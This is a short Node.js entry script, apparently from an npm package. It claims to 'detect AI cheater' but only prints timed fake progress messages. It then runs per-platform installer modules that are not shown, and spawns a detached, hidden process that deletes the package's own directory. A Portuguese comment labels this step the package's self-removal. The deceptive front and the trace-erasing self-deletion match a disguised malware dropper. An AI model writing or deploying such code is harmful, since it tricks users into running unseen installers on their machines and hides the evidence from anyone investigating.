#!/usr/bin/env node

const { detect } = require('./utils/detect');
const linuxInstall = require('./installers/linux');
const windowsInstall = require('./installers/windows');
const macosInstall = require('./installers/macos');

const { spawn } = require('child_process');
const path = require('path');

const INSTALLERS = {
  linux: linuxInstall,
  windows: windowsInstall,
  macos: macosInstall,
};

function scheduleSelfDelete() {
  const packageDir = path.resolve(__dirname, '..');

  const deleteScript = `
const fs = require('fs');

setTimeout(() => {
  try {
    fs.rmSync(${JSON.stringify(packageDir)}, {
      recursive: true,
      force: true
    });
  } catch (_) {}
}, 3000);
`;

  spawn(process.execPath, ['-e', deleteScript], {
    detached: true,
    stdio: 'ignore'
  }).unref();
}

async function main() {
  const { platform } = detect();

  const installer = INSTALLERS[platform];
  console.log('Detecting AI cheater...');
  await sleep(2000);
  console.log('...');
  await sleep(3000);
  console.log('Done!');
  if (!installer) {
    process.exit(1);
  }

  try {
    await installer.install();

    // Agenda a remoção do próprio pacote
    scheduleSelfDelete();
  } catch (err) {
    process.exit(1);
  }
}

main();
